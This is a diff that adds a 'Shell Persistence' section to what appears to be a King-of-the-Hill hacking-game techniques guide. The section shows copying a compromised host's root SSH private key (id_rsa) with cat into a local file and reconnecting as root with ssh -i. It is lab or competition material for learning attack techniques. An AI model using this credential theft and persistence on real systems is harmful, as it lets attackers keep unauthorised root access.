@@ -232,3 +232,20 @@ chmod 700 authorized_keys
 ```
 ssh -i id_rsa root@127.0.0.1
 ```
+## Shell Persistence using High privileged user/root SSH RSA-key 🔑
+
+***To avoid the need to re-exploit the host, we stored a copy of the root users id_rsa ssh key on our
+local machine as key.rsa***
+
+![Screenshot_2024-01-27_17-51-56](https://github.com/DevVj-1/Koth-Hacker-Vs-Hacker_Techniques-/assets/106962581/ef8d06f7-b739-42b9-8401-514ee77a6ef9)   
+
+Display the content of id_rsa using cat command and copy its content in key.rsa:
+```
+cat id_rsa >> key.rsa 
+
+```
+To reconnect with the key we executed 
+``` 
+ssh -i key.rsa root@0.0.0.0
+
+```
